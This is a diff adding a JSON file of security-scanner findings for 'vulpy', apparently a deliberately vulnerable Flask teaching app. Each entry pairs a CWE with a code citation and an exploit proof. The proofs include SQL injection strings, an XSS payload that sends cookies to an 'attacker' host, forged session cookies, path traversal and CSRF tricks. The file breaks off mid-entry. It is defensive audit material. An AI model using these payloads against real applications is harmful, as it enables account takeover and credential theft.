@@ -1,0 +1,1223 @@
+{
+  "version": "twin-distill-flash-dsonly",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "bad/libuser.py",
+      "start": {
+        "line": 12
+      },
+      "end": {
+        "line": 12
+      },
+      "extra": {
+        "message": "SQL Injection in login function",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "user = c.execute(\"SELECT * FROM users WHERE username = '{}' and password = '{}'\".format(username, password)).fetchone()",
+          "proof": "SOURCE: mod_user.py lines 14-15 receive username and password from request.form.get() (HTTP POST body). These are passed to libuser.login(username, password) at mod_user.py line 17. SINK: libuser.py line 12 interpolates both values into the SQL query using Python .format() without sanitization or parameterization. An attacker can bypass authentication entirely by supplying a username like admin'-- or admin' OR '1'='1."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "bad/libuser.py",
+      "start": {
+        "line": 50
+      },
+      "end": {
+        "line": 50
+      },
+      "extra": {
+        "message": "SQL Injection in password_change function",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "c.execute(\"UPDATE users SET password = '{}' WHERE username = '{}'\".format(password, username))",
+          "proof": "SOURCE: mod_user.py line 72 gets password from request.form.get('password'), and g.session['username'] (which can be tampered with via session forgery, finding CWE-287) is used as the username. SINK: libuser.py line 50 interpolates both into an UPDATE statement using .format(). An attacker can inject SQL in the password field (e.g., 'newpass' WHERE username='admin' --) to change any user's password, or use session tampering to set the username to a crafted value."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-287",
+      "path": "bad/libsession.py",
+      "start": {
+        "line": 6
+      },
+      "end": {
+        "line": 6
+      },
+      "extra": {
+        "message": "Session cookie lacks integrity protection (session tampering/forgery)",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-287"
+          ],
+          "citation": "session = base64.b64encode(json.dumps({'username': username}).encode())",
+          "proof": "SOURCE: An attacker with access to any session cookie can decode it (base64 is trivially reversible) and forge a new one. The session cookie is simply base64(json({'username': '...'})). No HMAC, no encryption, no server-side signature. SINK: libsession.py line 6 creates the cookie without any integrity protection. libsession.py line 20 loads it with json.loads(base64.b64decode(cookie)) without any signature verification. An attacker can craft a cookie for any username, e.g., base64('{\"username\": \"admin\"}'), and immediately impersonate that user."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-287",
+      "path": "bad/libsession.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Session loader accepts unsigned/forged cookies",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-287"
+          ],
+          "citation": "session = json.loads(base64.b64decode(cookie))",
+          "proof": "SOURCE: The HTTP cookie header is attacker-controlled. SINK: libsession.py line 20 decodes and parses the cookie with json.loads(base64.b64decode(cookie)) without any cryptographic verification. Combined with the unsigned cookie created at line 6, this allows an attacker to present any base64-encoded JSON payload as their session. The try/except on line 21 silently swallows errors, making it impossible to detect tampering."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "bad/templates/posts.view.html",
+      "start": {
+        "line": 23
+      },
+      "end": {
+        "line": 23
+      },
+      "extra": {
+        "message": "Stored Cross-Site Scripting (XSS) via post text with safe filter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "<li><span class=\"w3-h3\">{{ post.text | safe }}</span></li>",
+          "proof": "SOURCE: mod_posts.py line 24 receives text from request.form.get('text') (HTTP POST body). This is stored in the database via libposts.post() at line 25 with no HTML sanitization. SINK: posts.view.html line 23 renders post.text with Jinja2's |safe filter, which disables auto-escaping. Any JavaScript embedded in a post (e.g., <script>new Image().src='http://attacker/?c='+document.cookie</script>) will execute in every viewer's browser."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "bad/mod_posts.py",
+      "start": {
+        "line": 12
+      },
+      "end": {
+        "line": 12
+      },
+      "extra": {
+        "message": "Insecure Direct Object Reference (IDOR) - anyone can view any user's posts",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "def do_view(username=None):\n\n    if not username:\n        if 'username' in g.session:\n            username = g.session['username']\n\n    posts = libposts.get_posts(username)",
+          "proof": "SOURCE: The username parameter comes from the URL path /posts/<username> (line 10-11 route definitions). No authentication or authorization check is performed on the requested username. SINK: libposts.get_posts(username) at line 18 fetches posts for the supplied username without verifying that the requester owns or is authorized to view that user's posts. An unauthenticated attacker can visit /posts/admin and see all of admin's posts."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "bad/mod_api.py",
+      "start": {
+        "line": 49
+      },
+      "end": {
+        "line": 49
+      },
+      "extra": {
+        "message": "API endpoint has no authentication - IDOR on post listing",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "@mod_api.route('/post/<username>', methods=['GET'])\ndef do_post_list(username):\n    posts = libposts.get_posts(username)\n    return jsonify(posts)",
+          "proof": "SOURCE: The username comes from the URL path /api/post/<username>. There is zero authentication on this GET endpoint - no API key check, no session check, no header requirement. SINK: libposts.get_posts(username) at line 49 fetches all posts for the supplied username and returns them as JSON. An attacker can enumerate usernames from the public /posts/ user list and call /api/post/admin, /api/post/john, etc. to exfiltrate every user's posts."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "bad/libuser.py",
+      "start": {
+        "line": 26
+      },
+      "end": {
+        "line": 26
+      },
+      "extra": {
+        "message": "SQL Injection in create() via % string formatting",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "c.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%d', '%d', '%s')\" %(username, password, 0, 0, ''))",
+          "proof": "SOURCE: mod_user.py lines 42-43: username = request.form.get('username'), password = request.form.get('password') -> mod_user.py line 50: libuser.create(username, password) -> SINK: libuser.py line 26: user-supplied values formatted into SQL INSERT via % operator with no parameterization, enabling arbitrary SQL injection including sub-queries and data exfiltration."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-41",
+      "path": "bad/libapi.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "API authentication bypass via glob pattern injection in X-APIKEY header",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-41"
+          ],
+          "citation": "for f in Path('/tmp/').glob('vulpy.apikey.*.' + key):",
+          "proof": "SOURCE: libapi.py line 31: key = request.headers['X-APIKEY'] (attacker-controlled HTTP header) -> SINK: libapi.py line 33: the key value is concatenated directly into a glob() pattern. An attacker sending X-APIKEY: * causes Path('/tmp/').glob('vulpy.apikey.*.*') to match ALL API key files in /tmp/, returning the first matched username and bypassing authentication entirely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "bad/libapi.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Path traversal via username in API key file creation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "keyfile = '/tmp/vulpy.apikey.{}.{}'.format(username, key)\n\n    Path(keyfile).touch()",
+          "proof": "SOURCE: mod_api.py line 40: data['username'] from JSON POST body -> libapi.py line 8: keygen(username, ...) -> SINK: libapi.py line 20-22: attacker-controlled username is formatted into a filesystem path and Path().touch() creates the file. A username like '../../etc/cron.attacker' resolves to '/tmp/vulpy.apikey.../../etc/cron.attacker.KEYHASH' which normalizes to '/etc/cron.attacker.KEYHASH', allowing arbitrary file creation outside /tmp/. Additionally, line 16 uses the same username in a glob pattern: Path('/tmp/').glob('vulpy.apikey.' + username + '.*'), providing another injection surface."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "bad/vulpy.py",
+      "start": {
+        "line": 16
+      },
+      "end": {
+        "line": 16
+      },
+      "extra": {
+        "message": "Hardcoded Flask SECRET_KEY",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "app.config['SECRET_KEY'] = 'aaaaaaa'",
+          "proof": "The Flask SECRET_KEY is a known, hardcoded string 'aaaaaaa' committed to source code. If Flask's built-in signed session cookies were used, an attacker who knows this key can forge valid signed sessions. Even though this app uses custom unsigned session cookies (see finding CWE-287), the hardcoded key also compromises built-in Flask features like flash() message signing and any future use of Flask's session."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "bad/mod_api.py",
+      "start": {
+        "line": 55
+      },
+      "end": {
+        "line": 55
+      },
+      "extra": {
+        "message": "Mass Assignment \u2014 API post creation overrides authenticated username via request body",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "data.update(request.get_json())",
+          "proof": "SOURCE: request body JSON (attacker-controlled) -> SINK: data.update() overwrites the authenticated `username` dict key. The `post_schema` lacks `additionalProperties: False`, so extra fields in the JSON body pass validation. An attacker with a valid API key can craft `{\"text\":\"msg\",\"username\":\"victim\"}` to post as any user."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "bad/mod_mfa.py",
+      "start": {
+        "line": 65
+      },
+      "end": {
+        "line": 65
+      },
+      "extra": {
+        "message": "CSRF \u2014 MFA disabled via unauthenticated GET request",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@mod_mfa.route('/disable', methods=['GET'])\ndef do_mfa_disable():\n\n    if 'username' not in g.session:\n        return redirect('/user/login')\n\n    libmfa.mfa_disable(g.session['username'])",
+          "proof": "SOURCE: Cross-origin `<img src=\"http://vulpy/mfa/disable\">` -> SINK: GET handler at `/mfa/disable` calls `mfa_disable(g.session['username'])` without CSRF token, referer check, or POST requirement. A logged-in victim who visits an attacker page silently has MFA disabled."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-330",
+      "path": "bad/libapi.py",
+      "start": {
+        "line": 14
+      },
+      "end": {
+        "line": 14
+      },
+      "extra": {
+        "message": "Weak PRNG used for cryptographically-sensitive API key generation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-330"
+          ],
+          "citation": "key = hashlib.sha256(str(random.getrandbits(2048)).encode()).hexdigest()",
+          "proof": "SOURCE: `random.getrandbits(2048)` (Mersenne Twister, not cryptographically secure) -> SINK: key used as bearer token for API authentication. Python's `random` module is predictable \u2014 an attacker who observes a few keys can reconstruct the PRNG state and forge future API keys."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-256",
+      "path": "bad/db_init.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Plaintext password storage in users database",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-256"
+          ],
+          "citation": "c.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%d', '%d', '%s')\" %(u, p, 0, 0, ''))",
+          "proof": "SOURCE: `users` tuple list with plaintext passwords -> SINK: direct INSERT into `db_users.sqlite` with zero hashing or salting. Anyone who acquires the SQLite file can read all credentials instantly."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-620",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 94
+      },
+      "end": {
+        "line": 94
+      },
+      "extra": {
+        "message": "Password change does not verify current password",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-620"
+          ],
+          "citation": "libuser.password_change(g.session['username'], password)",
+          "proof": "SOURCE: `password` from `request.form` (attacker-controlled) -> SINK: `libuser.password_change()` uses only the new password and session username, never asking for the current password. Combined with the absence of CSRF protection on this POST endpoint, an attacker who tricks a logged-in user can silently change the victim's password."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-521",
+      "path": "bad/libuser.py",
+      "start": {
+        "line": 63
+      },
+      "end": {
+        "line": 63
+      },
+      "extra": {
+        "message": "Password complexity check always returns True",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-521"
+          ],
+          "citation": "def password_complexity(password):\n    return True",
+          "proof": "SOURCE: user-supplied password (any value) -> SINK: `password_complexity()` unconditionally returns True. No minimum length, character class, or strength requirement is enforced, enabling brute-force and weak-password account takeover."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-287",
+      "path": "bad/libapi.py",
+      "start": {
+        "line": 10
+      },
+      "end": {
+        "line": 10
+      },
+      "extra": {
+        "message": "Authentication bypass in keygen via empty/falsy password",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-287"
+          ],
+          "citation": "if password:\n        if not libuser.login(username, password):\n            return None",
+          "proof": "The keygen() function checks `if password:` (line 10). In Python, an empty string '' is falsy, so when the /api/key endpoint receives {\"username\":\"admin\",\"password\":\"\"} the login check is entirely skipped, allowing an attacker to generate a valid API key for any user without knowing their credentials."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-338",
+      "path": "bad/libapi.py",
+      "start": {
+        "line": 14
+      },
+      "end": {
+        "line": 14
+      },
+      "extra": {
+        "message": "Weak PRNG used for API key generation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-338"
+          ],
+          "citation": "key = hashlib.sha256(str(random.getrandbits(2048)).encode()).hexdigest()",
+          "proof": "Python's random module uses the Mersenne Twister PRNG, which is not cryptographically secure. The state can be reconstructed after observing 624 consecutive 32-bit outputs, potentially enabling an attacker to predict future API keys."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-489",
+      "path": "bad/vulpy.py",
+      "start": {
+        "line": 55
+      },
+      "end": {
+        "line": 55
+      },
+      "extra": {
+        "message": "Flask debug mode enabled exposing Werkzeug debugger RCE",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-489"
+          ],
+          "citation": "app.run(debug=True, host='127.0.1.1', port=5000, extra_files='csp.txt')",
+          "proof": "SOURCE: `debug=True` -> SINK: Werkzeug debugger and interactive console are active. An attacker can trigger an unhandled exception to obtain a debugger PIN and use the interactive console for arbitrary code execution on the server."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-287",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 94
+      },
+      "end": {
+        "line": 94
+      },
+      "extra": {
+        "message": "Password change for any user via forged unsigned session cookie",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-287"
+          ],
+          "citation": "libuser.password_change(g.session['username'], password)",
+          "proof": "The do_chpasswd() endpoint uses g.session['username'] to identify the user whose password to change. g.session is loaded from an unsigned base64-encoded JSON cookie (libsession.load). An attacker can forge the cookie {\"username\":\"admin\"}, base64-encode it, and POST to /user/chpasswd with a new password to take over any account."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-287",
+      "path": "bad/mod_mfa.py",
+      "start": {
+        "line": 70
+      },
+      "end": {
+        "line": 70
+      },
+      "extra": {
+        "message": "MFA disable for any user via forged unsigned session cookie",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-287"
+          ],
+          "citation": "libmfa.mfa_disable(g.session['username'])",
+          "proof": "The do_mfa_disable() endpoint at /mfa/disable uses g.session['username'] from the forgeable unsigned cookie to determine whose MFA to disable. An attacker can base64-encode {\"username\":\"admin\"}, set the vulpy_session cookie, and visit /mfa/disable to disable MFA for any user."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "bad/mod_posts.py",
+      "start": {
+        "line": 36
+      },
+      "end": {
+        "line": 36
+      },
+      "extra": {
+        "message": "CSRF on post creation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "libposts.post(username, text)",
+          "proof": "SOURCE: request.form.get('text') from attacker-controlled form POST to /posts/ -> SINK: libposts.post(username, text) at line 36 creates a post on behalf of the session user. There is no CSRF token, Origin header check, or SameSite enforcement, so a cross-origin form can auto-submit and post arbitrary content as the victim."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 35
+      },
+      "end": {
+        "line": 35
+      },
+      "extra": {
+        "message": "CSRF on login POST",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "response = libsession.create(response=response, username=username)",
+          "proof": "SOURCE: request.form.get('username') from attacker-controlled form POST to /user/login -> SINK: libsession.create() at line 35 sets a session cookie with the authenticated username. No CSRF token is validated. An attacker can craft a cross-origin form submission that logs the victim in as the attacker's account, enabling tracking or subsequent attacker-framed actions."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 53
+      },
+      "end": {
+        "line": 53
+      },
+      "extra": {
+        "message": "CSRF on user creation POST",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "libuser.create(username, password)",
+          "proof": "SOURCE: request.form.get('username') and request.form.get('password') from attacker-controlled form POST to /user/create -> SINK: libuser.create() at line 53 inserts a new user row into the database. No CSRF token is present, enabling cross-site account registration and database flooding."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 81
+      },
+      "end": {
+        "line": 81
+      },
+      "extra": {
+        "message": "CSRF on password change POST",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "libuser.password_change(g.session['username'], password)",
+          "proof": "SOURCE: request.form.get('password') from attacker-controlled form POST to /user/chpasswd -> SINK: password_change() at line 81 updates the user's password in the database. No CSRF token and no current-password verification (CWE-620) means a single cross-origin request changes the victim's password to the attacker's chosen value, achieving full account takeover."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "bad/db.py",
+      "start": {
+        "line": 8
+      },
+      "end": {
+        "line": 8
+      },
+      "extra": {
+        "message": "Hardcoded default credentials in database seed script",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "('admin', pbkdf2_sha256.encrypt('123456')), ('john', pbkdf2_sha256.encrypt('Password')), ('tim', pbkdf2_sha256.encrypt('Vaider2'))",
+          "proof": "SOURCE: static strings hardcoded in bad/db.py lines 8-10 -> SINK: inserted verbatim into users table via INSERT statement. The passwords '123456', 'Password', and 'Vaider2' are guessable common passwords discoverable by anyone with source access (leaked repo, insider, CI logs), enabling immediate account compromise on any deployment using this seed data."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "bad/vulpy-ssl.py",
+      "start": {
+        "line": 13
+      },
+      "end": {
+        "line": 13
+      },
+      "extra": {
+        "message": "Hardcoded Flask SECRET_KEY in SSL variant",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "app.config['SECRET_KEY'] = 'aaaaaaa'",
+          "proof": "SOURCE: hardcoded string 'aaaaaaa' -> SINK: assigned to app.config['SECRET_KEY'] at line 13. This key signs Flask session cookies; a trivial 7-character key is trivially brute-forced, allowing arbitrary session forgery and complete account impersonation."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "bad/libuser.py",
+      "start": {
+        "line": 8
+      },
+      "end": {
+        "line": 8
+      },
+      "extra": {
+        "message": "SQL query tracing prints passwords to stdout",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "conn.set_trace_callback(print)",
+          "proof": "SOURCE: Every SQL statement executed on this connection, including SELECT queries with plaintext passwords in WHERE clauses (line 11: WHERE username = '{}' and password = '{}'.format(...)) -> SINK: set_trace_callback(print) at line 8 pipes the full expanded SQL text to stdout. Anyone monitoring terminal output, CI logs, or container logs can read plaintext credentials."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "bad/libmfa.py",
+      "start": {
+        "line": 8
+      },
+      "end": {
+        "line": 8
+      },
+      "extra": {
+        "message": "SQL query tracing in MFA module leaks sensitive data",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "conn.set_trace_callback(print)",
+          "proof": "SOURCE: SQL queries in MFA operations including mfa_secret values (e.g., UPDATE users SET mfa_secret = ? WHERE username = ? in mfa_reset_secret) -> SINK: set_trace_callback(print) at line 8 prints queries to stdout with bound parameter values expanded, exposing MFA secrets and account metadata to anyone monitoring terminal or container logs."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "bad/libposts.py",
+      "start": {
+        "line": 10
+      },
+      "end": {
+        "line": 10
+      },
+      "extra": {
+        "message": "SQL query tracing in posts module prints post content",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "conn.set_trace_callback(print)",
+          "proof": "SOURCE: Post text and usernames in INSERT/SELECT SQL statements (line 14: INSERT INTO posts (username, text, date) VALUES (?, ?, ...)) -> SINK: set_trace_callback(print) at line 10 (and line 24 in post()) prints the expanded SQL with actual parameter values to stdout, leaking user-generated content to anyone monitoring terminal or container logs."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "bad/templates/mfa.enable.html",
+      "start": {
+        "line": 16
+      },
+      "end": {
+        "line": 16
+      },
+      "extra": {
+        "message": "MFA provisioning URI with TOTP secret rendered in HTML page",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "{{ secret_url }}",
+          "proof": "SOURCE: secret_url variable set at mod_mfa.py line 25 via pyotp.totp.TOTP(secret).provisioning_uri(...) which produces an otpauth:// URI containing ?secret=<BASE32_SECRET> -> SINK: rendered unescaped into HTML at mfa.enable.html line 16 via {{ secret_url }}. Any page viewer \u2014 including browser extensions, cached page readers, or shoulder surfers \u2014 can read the secret and generate valid OTPs, defeating MFA."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "bad/api_post.py",
+      "start": {
+        "line": 25
+      },
+      "end": {
+        "line": 25
+      },
+      "extra": {
+        "message": "API key printed to stdout in plaintext",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "print('Received key:', api_key)",
+          "proof": "SOURCE: api_key returned from r.json()['key'] at line 24 (from /api/key endpoint response) -> SINK: print() at line 25 writes the key to stdout. Terminal scrollback, CI logs, and container stdout capture all record the key, enabling long-term credential theft for the API."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1004",
+      "path": "bad/libsession.py",
+      "start": {
+        "line": 7
+      },
+      "end": {
+        "line": 7
+      },
+      "extra": {
+        "message": "Session cookie set without Secure, HttpOnly, or SameSite flags",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-1004"
+          ],
+          "citation": "response.set_cookie('vulpy_session', session)",
+          "proof": "SOURCE: session value derived from base64-encoded JSON of username -> SINK: set_cookie() at line 7 without Secure, HttpOnly, or SameSite parameters. The cookie is sent over unencrypted HTTP (attacker can sniff), readable by JavaScript (XSS can exfiltrate), and not protected by SameSite (CSRF-attached), making it trivially stealable or forgeable in cross-origin scenarios."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-489",
+      "path": "bad/vulpy-ssl.py",
+      "start": {
+        "line": 29
+      },
+      "end": {
+        "line": 29
+      },
+      "extra": {
+        "message": "Flask debug mode enabled in SSL deployment",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-489"
+          ],
+          "citation": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))",
+          "proof": "SOURCE: debug=True parameter -> SINK: app.run() at line 29 enables the Werkzeug debugger and live reload. An attacker reaching this endpoint can access the interactive debugger console (RCE) or see detailed tracebacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Missing rate limiting on login endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "username = libuser.login(username, password)",
+          "proof": "SOURCE: attacker submits unlimited POST requests to /user/login with guessed passwords -> SINK: libuser.login() at line 20 with no throttling before or after. An automated attacker can brute-force credentials indefinitely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 78
+      },
+      "end": {
+        "line": 78
+      },
+      "extra": {
+        "message": "Missing rate limiting on password change endpoint",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "libuser.password_change(g.session['username'], password)",
+          "proof": "SOURCE: attacker submits unlimited POST requests to /user/chpasswd -> SINK: libuser.password_change() at line 78 with no throttling. An attacker with a forged session can rapidly change passwords without rate limits."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "bad/mod_mfa.py",
+      "start": {
+        "line": 46
+      },
+      "end": {
+        "line": 46
+      },
+      "extra": {
+        "message": "Missing rate limiting on MFA OTP verification",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "if totp.verify(otp):",
+          "proof": "SOURCE: attacker submits unlimited OTP guesses via POST to /mfa/ -> SINK: pyotp.TOTP.verify(otp) at line 46 without throttling. A 6-digit TOTP (1M possibilities) can be brute-forced with no lockout."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "bad/mod_api.py",
+      "start": {
+        "line": 38
+      },
+      "end": {
+        "line": 38
+      },
+      "extra": {
+        "message": "Missing rate limiting on API key creation endpoint",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "key = libapi.keygen(data['username'], data['password'])",
+          "proof": "SOURCE: attacker submits unlimited POST requests to /api/key with credential guesses -> SINK: libapi.keygen() at line 38 with no throttling. Enables credential brute-force against all users and resource exhaustion via excessive key files in /tmp/."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "bad/mod_user.py",
+      "start": {
+        "line": 14
+      },
+      "end": {
+        "line": 14
+      },
+      "extra": {
+        "message": "CSRF on login \u2014 POST /user/login lacks anti-CSRF token",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "    if request.method == 'POST':",
+          "proof": "SOURCE: request.form (username, password) from attacker-controlled page -> SINK: libsession.create() sets session cookie at line 32. No CSRF token or header is validated before processing the login, allowing login CSRF (force-log victim into attacker-controlled account)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "bad/mod_mfa.py",
+      "start": {
+        "line": 34
+      },
+      "end": {
+        "line": 34
+      },
+      "extra": {
+        "message": "CSRF on MFA enable \u2014 POST /mfa/ lacks anti-CSRF token",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@mod_mfa.route('/', methods=['POST'])",
+          "proof": "SOURCE: request.form.get('otp') -> SINK: libmfa.mfa_enable() at line 48. No CSRF token is validated. Exploitation requires knowing a valid OTP for the time window, but combined with session forgery an attacker can CSRF-enable MFA."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "bad/libuser.py",
+      "start": {
+        "line": 46
+      },
+      "end": {
+        "line": 46
+      },
+      "extra": {
+        "message": "Plaintext new passwords written to stdout via SQL trace callback",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "    conn.set_trace_callback(print)",
+          "proof": "SOURCE: new password from request.form -> libuser.password_change(username, password) -> line 50: c.execute(\"UPDATE users SET password = '{}'\".format(password)) -> SINK: set_trace_callback(print) at line 46 causes the SQL UPDATE containing the new plaintext password to be printed to stdout. Every password change leaks the new password to server console/logs."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "bad/libmfa.py",
+      "start": {
+        "line": 72
+      },
+      "end": {
+        "line": 72
+      },
+      "extra": {
+        "message": "TOTP MFA secrets written to stdout via SQL trace callback",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "    conn.set_trace_callback(print)",
+          "proof": "SOURCE: pyotp.random_base32() generates a TOTP secret -> mfa_reset_secret() -> line 78: c.execute(\"UPDATE users SET mfa_secret = ?\", (secret,)) -> SINK: set_trace_callback(print) at line 72 causes the SQL UPDATE containing the plaintext TOTP secret to be printed to stdout. Anyone with server log access can steal MFA seeds and generate valid OTPs."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "bad/libsession.py",
+      "start": {
+        "line": 8
+      },
+      "end": {
+        "line": 8
+      },
+      "extra": {
+        "message": "Session cookie set without Secure, HttpOnly, or SameSite flags",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "    response.set_cookie('vulpy_session', session)",
+          "proof": "SOURCE: libsession.create() at line 6 constructs the cookie value -> SINK: response.set_cookie('vulpy_session', session) at line 8 sets the cookie with default Flask parameters: secure=False (transmitted over HTTP), httponly=False (accessible to JavaScript/XSS), samesite=None (sent on cross-site requests enabling CSRF). The session cookie contains the authenticated username and lacks all standard cookie security attributes."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "bad/libuser.py",
+      "start": {
+        "line": 12
+      },
+      "end": {
